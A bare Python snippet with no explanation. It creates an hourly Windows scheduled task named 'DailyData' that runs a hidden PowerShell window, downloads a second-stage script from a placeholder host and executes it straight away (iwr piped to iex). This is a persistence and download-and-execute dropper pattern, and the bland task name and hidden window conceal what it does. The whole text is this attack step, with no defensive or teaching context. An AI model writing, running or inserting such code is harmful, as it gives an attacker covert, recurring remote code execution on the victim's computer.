import subprocess
subprocess.run(["schtasks.exe", "/Create", "/TN", "DailyData", "/SC", "HOURLY", "/TR", "powershell -NoProfile -WindowStyle Hidden -Command iwr https://example.invalid/second.ps1 | iex"])
